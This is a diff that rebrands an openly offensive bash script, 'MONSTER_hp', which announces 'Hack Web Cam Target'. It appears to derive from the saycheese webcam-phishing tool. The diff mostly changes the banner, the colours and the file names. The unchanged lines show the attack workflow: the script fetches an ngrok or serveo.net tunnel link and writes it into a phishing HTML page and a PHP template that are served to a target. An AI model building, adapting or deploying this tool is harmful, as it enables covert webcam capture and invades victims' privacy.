@@ -1,4 +1,4 @@
-#_ _  __  ___  _   _ ____ _____ _____ ____      _   _    _    ____ _  __ 
+__  __  ___  _   _ ____ _____ _____ ____      _   _    _    ____ _  __ 
 #|  \/  |/ _ \| \ | / ___|_   _| ____|  _ \    | | | |  / \  / ___| |/ / 
 #| |\/| | | | |  \| \___ \ | | |  _| | |_) |   | |_| | / _ \| |   | ' /  
 #| |  | | |_| | |\  |___) || | | |___|  _ <    |  _  |/ ___ \ |___| . \  
@@ -10,34 +10,31 @@
 #                         </> MONSTER_hp </>
 
 trap 'printf "\n";stop' 2
+
 clear
+
 banner() {
 
- 
-printf "\e[1;92m
- __  __                 _          __        __   _      ____                
-|  \/  | ___  _ __  ___| |_ ___ _ _\ \      / /__| |__  / ___|__ _ _ __ ___  
-| |\/| |/ _ \| '_ \/ __| __/ _ \ '__\ \ /\ / / _ \ '_ \| |   / _  | '_   _ |``
-| |  | | (_) | | | \__ \ ||  __/ |   \ V  V /  __/ |_) | |__| (_| | | | | | |
-|_|  |_|\___/|_| |_|___/\__\___|_|____\_/\_/ \___|_.__/ \____\__,_|_| |_| |_|
-                                |_____|                                      
-/n"
-printf "\e[1;90m    \n"
+printf "\e[1;91m
+ __  __                 _          __        __   _      ____                 
+|  \/  | ___  _ __  ___| |_ ___ _ _\ \      / /__| |__  / ___|__ _ _ __ ___   
+| |\/| |/ _ \| '_ \/ __| __/ _ \ '__\ \ /\ / / _ \ '_ \| |   / _  | '_   _ \  
+| |  | | (_) | | | \__ \ ||  __/ |   \ V  V /  __/ |_) | |__| (_| | | | | | | 
+|_|  |_|\___/|_| |_|___/\__\___|_|____\_/\_/ \___|_.__/ \____\__,_|_| |_| |_| 
+                                |_____|                                       
+\n"
 
-printf " \e[1;91m          ===> !!! Hack Web Cam Target !!!  <===\n"
-printf " \e[95m\n"
-printf " \e[1;93m GitHub : https://github.com/MONSTER-hp/MONSTER_HACK \n"
+printf " \e[1;91m      ===>  !!! Hack Web Cam  Target !!!  <===\n"
 printf " \e[90m\n"
-printf " \e[1;96m   Telegram Chanell : https://t.me/MONSTER_SECURITY\n"
+printf " \e[1;94m GitHub : https://github.com/MONSTER-hp/MONSTER_HACK \n"
 printf " \e[90m\n"
-printf " \e[1;95m      WebSayte : WwW.MONSTER-SECURITY.blogfa.com\n"
+printf " \e[1;92m   Telegram Chanell : https://t.me/MONSTER_SECURITY\n"
+printf " \e[90m\n"
+printf " \e[1;92m      WebSayte : WwW.MONSTER-SECURITY.blogfa.com\n"
 printf "\n"
 
 
-
-
 }
-
 
 stop() {
 
@@ -139,7 +136,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$link'+g' MONSTER_hp.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -204,7 +201,7 @@ printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m # MONSTER_hp~> \e[1;00m' option_server
+read -p $'\n\e1#\e[0m\e1 MONSTER_hp~> \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
@@ -227,7 +224,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' MONSTER_hp.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -236,7 +233,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
+default_subdomain="MONSTER_hp$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
